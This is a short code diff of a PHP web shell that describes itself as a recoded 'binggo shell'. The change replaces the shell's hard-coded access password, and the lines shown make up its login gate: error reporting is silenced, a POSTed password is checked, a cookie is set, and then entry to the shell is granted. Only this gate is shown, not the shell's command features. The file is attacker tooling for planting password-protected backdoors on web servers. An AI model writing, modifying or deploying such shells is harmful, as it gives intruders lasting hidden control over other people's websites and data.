@@ -5,7 +5,7 @@
 // The binggo shell I recoded.
 
 error_reporting(0);
-$password='oit';//Your pass
+$password='akuganteng';//Your pass
 $xyn='psatir';
 if(isset($_POST['pass'])) {if($_POST['pass']==$password) {setcookie($xyn, $_POST['pass'], time()+3600);} let_him_in();}
 if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
